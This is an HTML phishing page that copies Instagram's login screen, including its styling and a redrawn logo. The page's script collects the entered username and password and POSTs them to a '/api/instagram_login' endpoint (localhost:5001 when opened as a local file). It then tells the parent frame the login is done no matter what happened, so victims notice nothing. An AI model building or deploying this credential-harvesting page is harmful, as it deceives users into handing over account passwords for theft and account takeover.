<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Log in to Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: #f8f8f8;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-container {
            width: 100%;
            max-width: 480px;
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            padding: 50px 55px 40px 55px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }

        .instagram-logo {
            width: 90px;
            height: 90px;
            margin-bottom: 18px;
        }

        h1 {
            font-size: 29px;
            font-weight: 700;
            color: #262626;
            margin-bottom: 40px;
            letter-spacing: -0.8px;
            white-space: nowrap;
        }

        .input-field {
            width: 100%;
            padding: 16px 18px;
            font-size: 17px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 30px;
            outline: none;
            margin-bottom: 16px;
            transition: all 0.2s;
        }

        .input-field:focus {
            border-color: #0095f6;
            background-color: #fff;
            box-shadow: 0 0 0 2px rgba(0, 149, 246, 0.1);
        }

        .input-field::placeholder {
            color: #8e8e8e;
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            margin: 16px 0 24px;
            background-color: #0095f6;
            color: #ffffff;
            font-size: 17px;
            font-weight: 600;
            border: none;
            border-radius: 30px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .login-btn:hover {
            background-color: #0077c5;
        }

        .forgotten {
            color: #0095f6;
            font-size: 15px;
            text-decoration: none;
            margin-bottom: 30px;
            display: inline-block;
        }

        .forgotten:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <!-- More Accurate Instagram Logo -->
        <svg class="instagram-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <defs>
                <linearGradient id="igGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                    <stop offset="0%" stop-color="#F56040"/>
                    <stop offset="20%" stop-color="#F77737"/>
                    <stop offset="40%" stop-color="#E1306C"/>
                    <stop offset="60%" stop-color="#C13584"/>
                    <stop offset="80%" stop-color="#833AB4"/>
                    <stop offset="100%" stop-color="#5851DB"/>
                </linearGradient>
            </defs>
            
            <!-- Main Square -->
            <rect width="24" height="24" rx="6" fill="url(#igGradient)"/>
            
            <!-- White Border -->
            <rect x="1.8" y="1.8" width="20.4" height="20.4" rx="5.5" fill="none" stroke="#ffffff" stroke-width="1.4"/>
            
            <!-- Outer Circle -->
            <circle cx="12" cy="12" r="5.8" fill="none" stroke="#ffffff" stroke-width="1.7"/>
            
            <!-- Inner Circle -->
            <circle cx="12" cy="12" r="2.4" fill="#ffffff"/>
            
            <!-- Top-right small circle -->
            <circle cx="17.2" cy="6.8" r="1.35" fill="#ffffff"/>
        </svg>

        <h1>Log in to Instagram</h1>

        <input class="input-field" type="text" id="email" placeholder="Phone number, username, or email" />
        <input class="input-field" type="password" id="password" placeholder="Password" />

        <button class="login-btn" onclick="login()">Log in</button>

        <a href="#" class="forgotten">Forgot password?</a>
    </div>

    <script>
        async function login() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            if (!email || !password) {
                alert("Please enter username/email and password");
                return;
            }

            try {
                const apiHost = window.location.protocol === 'file:' ? 'http://localhost:5001' : '';
                const endpoint = apiHost + '/api/instagram_login';
                
                await fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });
                
                window.parent.postMessage({ type: 'INSTAGRAM_LOGIN_DONE' }, '*');
            } catch (error) {
                console.error(error);
                window.parent.postMessage({ type: 'INSTAGRAM_LOGIN_DONE' }, '*');
            }
        }

        document.addEventListener('keypress', function(e) {
            if (e.key === "Enter") {
                login();
            }
        });
    </script>

</body>
</html>
